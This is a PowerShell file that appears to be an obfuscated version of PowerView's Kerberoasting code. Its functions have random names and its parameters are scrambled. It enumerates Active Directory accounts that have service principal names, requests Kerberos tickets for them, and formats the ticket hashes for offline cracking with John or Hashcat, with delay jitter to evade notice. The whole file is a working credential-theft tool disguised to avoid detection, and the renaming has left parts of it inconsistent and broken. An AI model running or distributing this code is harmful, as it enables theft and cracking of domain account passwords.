function pioneer {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $BAsEZixZ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aNMeNKjq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $dFbVgFVF99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $NQKLiTck99,
        [ValidateNotNullOrEmpty()]
        [String]
        $fQyHPigU99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $iMdzFMnb99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $rdyxWAIV99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $VpJyiQOD99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $oksYGKEk99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kcnFiRmQ99,
        [Switch]
        $raNPwqam99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $cBUPhkTJ99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $QOoffaaZ99 = $BAsEZixZ99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $pvaIuHxf99 = necktie -cBUPhkTJ99 $cBUPhkTJ99
            }
            else {
                $pvaIuHxf99 = necktie
            }
            $QOoffaaZ99 = $pvaIuHxf99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($pvaIuHxf99) {
                    $pXWBreOB99 = $pvaIuHxf99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $pXWBreOB99 = ((necktie -cBUPhkTJ99 $cBUPhkTJ99).PdcRoleOwner).Name
                }
                else {
                    $pXWBreOB99 = ((necktie).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[pioneer] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $pXWBreOB99 = $iMdzFMnb99
        }
        $gTxPpKIi99 = 'LDAP://'
        if ($pXWBreOB99 -and ($pXWBreOB99.Trim() -ne '')) {
            $gTxPpKIi99 += $pXWBreOB99
            if ($QOoffaaZ99) {
                $gTxPpKIi99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $gTxPpKIi99 += $fQyHPigU99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($NQKLiTck99 -Match '^GC://') {
                $DN = $NQKLiTck99.ToUpper().Trim('/')
                $gTxPpKIi99 = ''
            }
            else {
                if ($NQKLiTck99 -match '^LDAP://') {
                    if ($NQKLiTck99 -match "LDAP://.+/.+") {
                        $gTxPpKIi99 = ''
                        $DN = $NQKLiTck99
                    }
                    else {
                        $DN = $NQKLiTck99.SubString(7)
                    }
                }
                else {
                    $DN = $NQKLiTck99
                }
            }
        }
        else {
            if ($QOoffaaZ99 -and ($QOoffaaZ99.Trim() -ne '')) {
                $DN = "DC=$($QOoffaaZ99.Replace('.', ',DC='))"
            }
        }
        $gTxPpKIi99 += $DN
        Write-Verbose "[pioneer] search string: $gTxPpKIi99"
        if ($cBUPhkTJ99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[pioneer] Using alternate credentials for LDAP connection"
            $pvaIuHxf99 = New-Object DirectoryServices.DirectoryEntry($gTxPpKIi99, $cBUPhkTJ99.UserName, $cBUPhkTJ99.GetNetworkCredential().Password)
            $dCUcYWyi99 = New-Object System.DirectoryServices.DirectorySearcher($pvaIuHxf99)
        }
        else {
            $dCUcYWyi99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$gTxPpKIi99)
        }
        $dCUcYWyi99.PageSize = $VpJyiQOD99
        $dCUcYWyi99.SearchScope = $rdyxWAIV99
        $dCUcYWyi99.CacheResults = $False
        $dCUcYWyi99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $dCUcYWyi99.ServerTimeLimit = $oksYGKEk99
        }
        if ($PSBoundParameters['Tombstone']) {
            $dCUcYWyi99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $dCUcYWyi99.filter = $aNMeNKjq99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $dCUcYWyi99.SecurityMasks = Switch ($kcnFiRmQ99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $ZnQjceIw99 = $dFbVgFVF99| ForEach-Object { $_.Split(',') }
            $Null = $dCUcYWyi99.PropertiesToLoad.AddRange(($ZnQjceIw99))
        }
        $dCUcYWyi99
    }
}
function Fijians {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $dFbVgFVF99
    )
    $ArgDzYmn99 = @{}
    $dFbVgFVF99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $ArgDzYmn99[$_] = $dFbVgFVF99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ArgDzYmn99[$_] = $dFbVgFVF99[$_][0] -as $rHYGcytt99
            }
            elseif ($_ -eq 'samaccounttype') {
                $ArgDzYmn99[$_] = $dFbVgFVF99[$_][0] -as $KoCBArdx99
            }
            elseif ($_ -eq 'objectguid') {
                $ArgDzYmn99[$_] = (New-Object Guid (,$dFbVgFVF99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ArgDzYmn99[$_] = $dFbVgFVF99[$_][0] -as $rVEbafwX99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $wbnRgffX99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $dFbVgFVF99[$_][0], 0
                if ($wbnRgffX99.Owner) {
                    $ArgDzYmn99['Owner'] = $wbnRgffX99.Owner
                }
                if ($wbnRgffX99.Group) {
                    $ArgDzYmn99['Group'] = $wbnRgffX99.Group
                }
                if ($wbnRgffX99.DiscretionaryAcl) {
                    $ArgDzYmn99['DiscretionaryAcl'] = $wbnRgffX99.DiscretionaryAcl
                }
                if ($wbnRgffX99.SystemAcl) {
                    $ArgDzYmn99['SystemAcl'] = $wbnRgffX99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($dFbVgFVF99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ArgDzYmn99[$_] = "NEVER"
                }
                else {
                    $ArgDzYmn99[$_] = [datetime]::fromfiletime($dFbVgFVF99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($dFbVgFVF99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $dFbVgFVF99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ArgDzYmn99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $ArgDzYmn99[$_] = ([datetime]::FromFileTime(($dFbVgFVF99[$_][0])))
                }
            }
            elseif ($dFbVgFVF99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $dFbVgFVF99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ArgDzYmn99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Fijians] error: $_"
                    $ArgDzYmn99[$_] = $Prop[$_]
                }
            }
            elseif ($dFbVgFVF99[$_].count -eq 1) {
                $ArgDzYmn99[$_] = $dFbVgFVF99[$_][0]
            }
            else {
                $ArgDzYmn99[$_] = $dFbVgFVF99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ArgDzYmn99
    }
    catch {
        Write-Warning "[Fijians] Error parsing LDAP properties : $_"
    }
}
function necktie {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $BAsEZixZ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $cBUPhkTJ99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[necktie] Using alternate credentials for necktie'
            if ($PSBoundParameters['Domain']) {
                $QOoffaaZ99 = $BAsEZixZ99
            }
            else {
                $QOoffaaZ99 = $cBUPhkTJ99.GetNetworkCredential().Domain
                Write-Verbose "[necktie] Extracted domain '$QOoffaaZ99' from -cBUPhkTJ99"
            }
            $dxFeMqew99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $QOoffaaZ99, $cBUPhkTJ99.UserName, $cBUPhkTJ99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($dxFeMqew99)
            }
            catch {
                Write-Verbose "[necktie] The specified domain '$QOoffaaZ99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $dxFeMqew99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $BAsEZixZ99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($dxFeMqew99)
            }
            catch {
                Write-Verbose "[necktie] The specified domain '$BAsEZixZ99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[necktie] Error retrieving the current domain: $_"
            }
        }
    }
}
function healthiness {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $HRyRjElm99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $nlFZsqHo99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $cBUPhkTJ99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $dRkmgZuS99 = Invoke-UserImpersonation -cBUPhkTJ99 $cBUPhkTJ99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $yLNRPjFj99 = $User
        }
        else {
            $yLNRPjFj99 = $SPN
        }
	
	$GEgAGdkZ99 = New-Object System.Random
        ForEach ($Object in $yLNRPjFj99) {
            if ($PSBoundParameters['User']) {
                $DoNUAina99 = $Object.ServicePrincipalName
                $ZlDxEsHI99 = $Object.SamAccountName
                $loETipgO99 = $Object.DistinguishedName
            }
            else {
                $DoNUAina99 = $Object
                $ZlDxEsHI99 = 'UNKNOWN'
                $loETipgO99 = 'UNKNOWN'
            }
            if ($DoNUAina99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $DoNUAina99 = $DoNUAina99[0]
            }
            try {
                $ZaCecLMh99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $DoNUAina99
            }
            catch {
                Write-Warning "[healthiness] Error requesting ticket for SPN '$DoNUAina99' from user '$loETipgO99' : $_"
            }
            if ($ZaCecLMh99) {
                $SIBdraLd99 = $ZaCecLMh99.GetRequest()
            }
            if ($SIBdraLd99) {
                $Out = New-Object PSObject
                $sZIuMzEG99 = [System.BitConverter]::ToString($SIBdraLd99) -replace '-'
                if($sZIuMzEG99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CgulUgPN99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $GGQaLfiz99 = $Matches.DataToEnd.Substring(0,$CgulUgPN99*2)
                    if($Matches.DataToEnd.Substring($CgulUgPN99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($ZaCecLMh99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($SIBdraLd99).Replace('-',''))
                    } else {
                        $Hash = "$($GGQaLfiz99.Substring(0,32))`$$($GGQaLfiz99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($ZaCecLMh99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($SIBdraLd99).Replace('-',''))
                }
                if($Hash) {
                    if ($HRyRjElm99 -match 'John') {
                        $nSatVxlq99 = "`$CVOKiOMH99`$$($ZaCecLMh99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($loETipgO99 -ne 'UNKNOWN') {
                            $LYBtFWxL99 = $loETipgO99.SubString($loETipgO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $LYBtFWxL99 = 'UNKNOWN'
                        }
                        $nSatVxlq99 = "`$CVOKiOMH99`$$($Etype)`$*$ZlDxEsHI99`$$LYBtFWxL99`$$($ZaCecLMh99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $nSatVxlq99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $ZlDxEsHI99
                $Out | Add-Member Noteproperty 'DistinguishedName' $loETipgO99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $ZaCecLMh99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $GEgAGdkZ99.Next((1-$nlFZsqHo99)*$Delay, (1+$nlFZsqHo99)*$Delay)
        }
    }
    END {
        if ($dRkmgZuS99) {
            Invoke-RevertToSelf -TokenHandle $dRkmgZuS99
        }
    }
}
function chairmen {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $EUGwcIQs99,
        [Switch]
        $SPN,
        [Switch]
        $ZVEWbnle99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $pHwKkSBB99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $AvEVfEXh99,
        [Switch]
        $UuhtPAyj99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $medKSTiO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $BAsEZixZ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aNMeNKjq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $dFbVgFVF99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $NQKLiTck99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $iMdzFMnb99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $rdyxWAIV99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $VpJyiQOD99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $oksYGKEk99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kcnFiRmQ99,
        [Switch]
        $raNPwqam99,
        [Alias('ReturnOne')]
        [Switch]
        $khVdsLrY99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $cBUPhkTJ99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $dNNzyfiC99 = @{}
        if ($PSBoundParameters['Domain']) { $dNNzyfiC99['Domain'] = $BAsEZixZ99 }
        if ($PSBoundParameters['Properties']) { $dNNzyfiC99['Properties'] = $dFbVgFVF99 }
        if ($PSBoundParameters['SearchBase']) { $dNNzyfiC99['SearchBase'] = $NQKLiTck99 }
        if ($PSBoundParameters['Server']) { $dNNzyfiC99['Server'] = $iMdzFMnb99 }
        if ($PSBoundParameters['SearchScope']) { $dNNzyfiC99['SearchScope'] = $rdyxWAIV99 }
        if ($PSBoundParameters['ResultPageSize']) { $dNNzyfiC99['ResultPageSize'] = $VpJyiQOD99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $dNNzyfiC99['ServerTimeLimit'] = $oksYGKEk99 }
        if ($PSBoundParameters['SecurityMasks']) { $dNNzyfiC99['SecurityMasks'] = $kcnFiRmQ99 }
        if ($PSBoundParameters['Tombstone']) { $dNNzyfiC99['Tombstone'] = $raNPwqam99 }
        if ($PSBoundParameters['Credential']) { $dNNzyfiC99['Credential'] = $cBUPhkTJ99 }
        $OSOMaavh99 = pioneer @SearcherArguments
    }
    PROCESS {
        if ($OSOMaavh99) {
            $WmgTdTtd99 = ''
            $jIetWnLM99 = ''
            $EUGwcIQs99 | Where-Object {$_} | ForEach-Object {
                $rasQYCew99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($rasQYCew99 -match '^S-1-') {
                    $WmgTdTtd99 += "(objectsid=$rasQYCew99)"
                }
                elseif ($rasQYCew99 -match '^CN=') {
                    $WmgTdTtd99 += "(distinguishedname=$rasQYCew99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $XDNVMKFs99 = $rasQYCew99.SubString($rasQYCew99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[chairmen] Extracted domain '$XDNVMKFs99' from '$rasQYCew99'"
                        $dNNzyfiC99['Domain'] = $XDNVMKFs99
                        $OSOMaavh99 = pioneer @SearcherArguments
                        if (-not $OSOMaavh99) {
                            Write-Warning "[chairmen] Unable to retrieve domain searcher for '$XDNVMKFs99'"
                        }
                    }
                }
                elseif ($rasQYCew99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $hDUJKILQ99 = (([Guid]$rasQYCew99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $WmgTdTtd99 += "(objectguid=$hDUJKILQ99)"
                }
                elseif ($rasQYCew99.Contains('\')) {
                    $YfNHmwXf99 = $rasQYCew99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($YfNHmwXf99) {
                        $LYBtFWxL99 = $YfNHmwXf99.SubString(0, $YfNHmwXf99.IndexOf('/'))
                        $XaBUFbSm99 = $rasQYCew99.Split('\')[1]
                        $WmgTdTtd99 += "(samAccountName=$XaBUFbSm99)"
                        $dNNzyfiC99['Domain'] = $LYBtFWxL99
                        Write-Verbose "[chairmen] Extracted domain '$LYBtFWxL99' from '$rasQYCew99'"
                        $OSOMaavh99 = pioneer @SearcherArguments
                    }
                }
                else {
                    $WmgTdTtd99 += "(samAccountName=$rasQYCew99)"
                }
            }
            if ($WmgTdTtd99 -and ($WmgTdTtd99.Trim() -ne '') ) {
                $jIetWnLM99 += "(|$WmgTdTtd99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[chairmen] Searching for non-null service principal names'
                $jIetWnLM99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[chairmen] Searching for users who can be delegated'
                $jIetWnLM99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[chairmen] Searching for users who are sensitive and not trusted for delegation'
                $jIetWnLM99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[chairmen] Searching for adminCount=1'
                $jIetWnLM99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[chairmen] Searching for users that are trusted to authenticate for other principals'
                $jIetWnLM99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[chairmen] Searching for user accounts that do not require kerberos preauthenticate'
                $jIetWnLM99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[chairmen] Using additional LDAP filter: $aNMeNKjq99"
                $jIetWnLM99 += "$aNMeNKjq99"
            }
            $EUKbTzXX99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $mWsxaPXi99 = $_.Substring(4)
                    $uHCSdnqM99 = [Int]($rVEbafwX99::$mWsxaPXi99)
                    $jIetWnLM99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$uHCSdnqM99))"
                }
                else {
                    $uHCSdnqM99 = [Int]($rVEbafwX99::$_)
                    $jIetWnLM99 += "(userAccountControl:1.2.840.113556.1.4.803:=$uHCSdnqM99)"
                }
            }
            $OSOMaavh99.filter = "(&(samAccountType=805306368)$jIetWnLM99)"
            Write-Verbose "[chairmen] filter string: $($OSOMaavh99.filter)"
            if ($PSBoundParameters['FindOne']) { $YonvZstK99 = $OSOMaavh99.FindOne() }
            else { $YonvZstK99 = $OSOMaavh99.FindAll() }
            $YonvZstK99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = Fijians -dFbVgFVF99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($YonvZstK99) {
                try { $YonvZstK99.dispose() }
                catch {
                    Write-Verbose "[chairmen] Error disposing of the Results object: $_"
                }
            }
            $OSOMaavh99.dispose()
        }
    }
}
function cheerlessly {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $EUGwcIQs99,
        [ValidateNotNullOrEmpty()]
        [String]
        $BAsEZixZ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aNMeNKjq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $NQKLiTck99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $iMdzFMnb99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $rdyxWAIV99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $VpJyiQOD99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $oksYGKEk99,
        [Switch]
        $raNPwqam99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $nlFZsqHo99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $HRyRjElm99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $cBUPhkTJ99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $yVfNgLMq99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $yVfNgLMq99['Domain'] = $BAsEZixZ99 }
        if ($PSBoundParameters['LDAPFilter']) { $yVfNgLMq99['LDAPFilter'] = $aNMeNKjq99 }
        if ($PSBoundParameters['SearchBase']) { $yVfNgLMq99['SearchBase'] = $NQKLiTck99 }
        if ($PSBoundParameters['Server']) { $yVfNgLMq99['Server'] = $iMdzFMnb99 }
        if ($PSBoundParameters['SearchScope']) { $yVfNgLMq99['SearchScope'] = $rdyxWAIV99 }
        if ($PSBoundParameters['ResultPageSize']) { $yVfNgLMq99['ResultPageSize'] = $VpJyiQOD99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $yVfNgLMq99['ServerTimeLimit'] = $oksYGKEk99 }
        if ($PSBoundParameters['Tombstone']) { $yVfNgLMq99['Tombstone'] = $raNPwqam99 }
        if ($PSBoundParameters['Credential']) { $yVfNgLMq99['Credential'] = $cBUPhkTJ99 }
        if ($PSBoundParameters['Credential']) {
            $dRkmgZuS99 = Invoke-UserImpersonation -cBUPhkTJ99 $cBUPhkTJ99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $yVfNgLMq99['Identity'] = $EUGwcIQs99 }
        chairmen @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | healthiness -Delay $Delay -HRyRjElm99 $HRyRjElm99 -nlFZsqHo99 $nlFZsqHo99
    }
    END {
        if ($dRkmgZuS99) {
            Invoke-RevertToSelf -TokenHandle $dRkmgZuS99
        }
    }
}
